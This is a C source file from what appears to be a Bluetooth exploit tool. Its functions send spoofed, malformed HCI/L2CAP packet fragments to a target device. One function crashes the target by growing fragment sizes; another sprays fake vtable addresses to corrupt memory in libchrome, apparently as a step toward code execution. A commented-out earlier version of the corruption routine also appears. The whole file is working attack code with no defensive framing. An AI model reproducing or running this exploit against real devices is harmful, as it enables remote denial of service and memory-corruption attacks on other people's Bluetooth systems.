#include "smash.h"

#include "log.h"
#include "bluetooth.h"

#include <stdlib.h>
#include <unistd.h>

#include <time.h>

// #define SMASH_CONNECTION_COUNT (16)
// #define SMASH_CONNECTION_COUNT (2)
// #define SMASH_PACKET_COUNT (128)
#define SMASH_CONNECTION_COUNT (12)
#define SMASH_PACKET_COUNT (32)
#define SMASH_PACKET_DELAY (50)

err_t smash_crash_target(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id)
{
    if (packet_id == NULL)
        ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

    uint8_t buffer[1024];
    memset(buffer, 'C', 1024);

    for (size_t i = 128 + 16; i < 512; i++)
    {
        size_t packet_size = i;
        uint8_t chosen_packet_id = *packet_id;

        LOGL_DBG_VAR(i, "%zu");
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, buffer, packet_size))
        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, buffer, packet_size))
        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        struct bluetooth_l2cap_header *packet = NULL;
        err_t err = bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id);
        if (err != NULL && err_root(err)->error_no == ETIMEDOUT)
            return NULL;

        free(packet);
        packet = NULL;
    }

    ERR_RET("CRASH_FAILED", "Could not crash target")
}

// err_t smash_corrupt_libchrome_vtable(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, uint64_t fake_vtable_address)
// {
//     if (packet_id == NULL)
//         ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

//     uint8_t buffer[128] = {0};
//     {
//         size_t i = 0                                                                                // We are now at partial_packet[handle]->data + 3
//                    + sizeof(uint64_t) - 3                                                           // We are now at partial_packet[handle]->data + sizeof(uint64_t)
//                    + sizeof(uint64_t) - (sizeof(struct bluetooth_remote_header) % sizeof(uint64_t)) // We are now at partial_packet[handle] + (some multiple of sizeof(uint64_t))
//             ;

//         for (; i < sizeof(buffer); i += sizeof(uint64_t))
//             *(uint64_t *)(buffer + i) = fake_vtable_address;
//     }

//     for (size_t i = 0; i < 128; i++)
//     {
//         LOGL_DBG_VAR(i, "%zu");
//         ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, (uint8_t *)buffer, 3))
//         ERR_FWD(bluetooth_inc_packet_id(packet_id))
//         ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, (uint8_t *)buffer, sizeof(buffer)))
//         ERR_FWD(bluetooth_inc_packet_id(packet_id))

//         struct timespec ts =
//             {
//                 .tv_sec = 0,
//                 .tv_nsec = 50 * 1000 * 1000 // 100 ms
//             };
//         nanosleep(&ts, NULL);
//     }

//     return NULL;
// }

err_t smash_corrupt_libchrome_vtable(const char *bdaddr_str, uint8_t *const packet_id, uint64_t fake_vtable_address)
{
    ERR_FWD(bluetooth_hci_set_ssp_mode(true));

    if (packet_id == NULL)
        ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

    uint8_t buffer[128] = {0};
    {
        size_t i = 0                                                                                // We are now at partial_packet[handle]->data + 3
                   + sizeof(uint64_t) - 3                                                           // We are now at partial_packet[handle]->data + sizeof(uint64_t)
                   + sizeof(uint64_t) - (sizeof(struct bluetooth_remote_header) % sizeof(uint64_t)) // We are now at partial_packet[handle] + (some multiple of sizeof(uint64_t))
            ;

        for (; i < sizeof(buffer); i += sizeof(uint64_t))
            *(uint64_t *)(buffer + i) = fake_vtable_address;
    }

    int hci_sock_fd, l2cap_sock_fd;
    uint16_t hci_handle;
    for (size_t i = 0; i < SMASH_CONNECTION_COUNT; i++)
    {
        ERR_FWD(bluetooth_hci_create(&hci_sock_fd));
        ERR_FWD(bluetooth_l2cap_create(&l2cap_sock_fd))
        ERR_FWD(bluetooth_l2cap_connect(l2cap_sock_fd, bdaddr_str, &hci_handle))

        for (size_t j = 0; j < SMASH_PACKET_COUNT; j++)
        {
            LOGL_DBG_VAR(j, "%zu");
            ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, (uint8_t *)buffer, 3))
            ERR_FWD(bluetooth_inc_packet_id(packet_id))
            ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, (uint8_t *)buffer, sizeof(buffer)))
            ERR_FWD(bluetooth_inc_packet_id(packet_id))

            struct timespec ts =
                {
                    .tv_sec = 0,
                    .tv_nsec = SMASH_PACKET_DELAY * 1000 * 1000 // 100 ms
                };
            nanosleep(&ts, NULL);
        }

        // sleep(4);
        ERR_FWD(bluetooth_l2cap_close(l2cap_sock_fd))
        ERR_FWD(bluetooth_hci_close(hci_sock_fd))
    }

    ERR_FWD(bluetooth_hci_set_ssp_mode(false));
    return NULL;
}